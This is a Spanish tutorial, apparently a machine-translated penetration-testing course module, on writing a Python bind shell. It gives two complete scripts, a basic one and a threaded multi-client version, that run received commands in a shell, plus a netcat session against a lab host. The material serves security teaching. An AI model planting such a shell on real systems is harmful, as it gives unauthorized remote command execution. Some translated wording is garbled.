# Un shell de enlace simple

---

Al obtener acceso a un servicio web interno con las credenciales que generamos utilizando la herramienta anterior, podemos obtener la ejecución de código remoto en el host web. Intentar usar nuestros conchas inversas misteriosamente no parece funcionar, pero descubrimos que podemos ejecutar scripts arbitrarios de Python. Abusemos de ese descubrimiento implementando y ejecutando nuestra propia Python`bind shell`.

Un caparazón de enlace es en su núcleo razonablemente simple. Es un proceso que se une a una dirección y puerto en la máquina host y luego escucha las conexiones entrantes al socket. Cuando se realiza una conexión, el shell de enlace, repetidamente, escuchará a los bytes que se le envían y los tratará como comandos sin procesar que se ejecutarán en el sistema en un subproceso. Una vez que haya recibido todos los bytes en trozos de algún tamaño, ejecutará el comando en el sistema de host y enviará la salida. Una implementación muy ingenua de tal shell de enlace es esta:

#### Un shell de enlace simple

Código:pitón

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

Dado que enviaremos esto a nuestro cliente, mejoraremos la calidad del código y lo haremos más confiable. Sin embargo, primero, analicémoslo.

El código consta de dos funciones hasta ahora: una función de envoltura para ejecutar comandos en el sistema y una función principal que contiene toda la lógica lanzada a un solo lugar. Esto es menos que ideal. La función principal establece un socket, se une a`0.0.0.0`(es decir, todas las interfaces disponibles) y el puerto deseado. Luego se configura para permitir como máximo cuatro conexiones no aceptadas antes de que comience a rechazar más las conexiones: el`listen`La función configura esto. El socket luego acepta nuevas conexiones entrantes. Esto es un llamado`blocking call`, lo que significa que el código se detendrá en esta línea de código y esperará una conexión. Cuando se establece una conexión, el`accept`la llamada devuelve dos cosas que almacenamos en las variables`client_socket`y`address`.

Muchas cosas suceden en el bucle de tiempo, así que déjanos desglosarlo en piezas más pequeñas. Primero, estos son nuestros objetivos:

- Reciba todos los bytes entrantes del cliente conectado (nuestra máquina de atacantes),
    
- convertir los bytes entrantes a un`cmd`cadena,
    
- Cierre la conexión si`cmd`es "salida",
    
- De lo contrario, ejecute el comando localmente y envíe la salida
    

Observe que eliminamos el último byte del`cmd`cadena. Esta es una dirección de carácter de nueva línea al presionar Enter al escribir el comando.

Cuando ejecutamos este script en nuestra máquina de destino, podemos usar`nc`En nuestra máquina de atacantes para conectarse al bandeo de enlace y obtener la ejecución del código remoto:

#### Iniciando el bande

  Un shell de enlace simple

```cmd-session
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

#### Conectarse a la bandeja de enlace

  Un shell de enlace simple

```shell-session
xnoxos@htb[/htb]$ nc 10.10.10.10 4444 -nv

(UNKNOWN) [10.10.10.10] 4444 (?) open

whoami
localnest\birb

hostname
LOCALNEST

dir 
Volume in drive C has no label.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    <DIR>          .
20-03-2021  21:22    <DIR>          ..
20-03-2021  21:22               929 bindshell.py
               1 File(s)            929 bytes
               2 Dir(s)  518.099.636.224 bytes free
exit
```

La desventaja de la implementación actual es que una vez que desconectamos, el proceso de bandeja de enlace se detiene. Una forma de solucionar esto es introducir`threads`y tenga la parte de ejecución de comando del código ejecutado en un hilo. Esto nos permitiría crear un nuevo hilo cada vez que una máquina se conecta a la carcasa, y luego solo tendríamos que detener el hilo adicional cuando salga la carcasa. Threads, en general, es un tema vasto y complejo, y Python también tiene sus peculiaridades. Para mantener una historia muy larga y complicada corta y directa, los hilos nos permiten ejecutar diferentes piezas de código`concurrently`, de manera similar a cómo los humanos multitarea. Tenga en cuenta que simultáneamente no es lo mismo que paralelo. En nuestro ejemplo, esto significa que, si bien un hilo está ocupado trabajando para nuestro cliente conectado, otro hilo (el principal) está listo para aceptar una nueva conexión entrante. Una vez que se realiza otra conexión, estos dos clientes conectados pueden ejecutar código en la máquina víctima usando el mismo shell de enlace.

Simplemente extrayendo el código que maneja la ejecución del comando a su función, es posible hacer que el shell de enlace primero escuche una nueva conexión, genere un hilo para esa conexión que maneja la ejecución del comando y finalmente comience a escuchar nuevas conexiones entrantes.

#### Admitiendo múltiples conexiones

Código:pitón

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```

Como podemos ver, hemos agregado un`handle_input`función que acepta un`client_socket`como parámetro. Cuando creamos un nuevo`Thread`objeto, configurar el`target`(función para ejecutar) y los parámetros de entrada como tupla, podemos iniciar este hilo y dejar que se ejecute en segundo plano. Además, un`from threading import Thread`fue agregado en la parte superior. Además, preste mucha atención al`args`en el`Thread`constructor. Esta es una tupla con solo un valor. Para diferenciar entre tuples de valor único y "padres de alcance", por ejemplo,`('Hello ' + 'world').upper()`Que tendrá`upper()`llamado a la cadena concatenada y no solo "mundo", la sintaxis para el valor único de las tuplas es`(val1, )`. Para dos valores de tuplas, es`(val1, val2)`y así sucesivamente. Además, sí, esa es una coma y luego nada para tuples de valor único. Confuso? Tal vez. Solo recuerda que`(5)`es lo mismo que`5`Debido a que las shesshes se usan para la agrupación, necesitaríamos alguna forma de diferenciar entre la agrupación sintáctica y un tipo de tupla.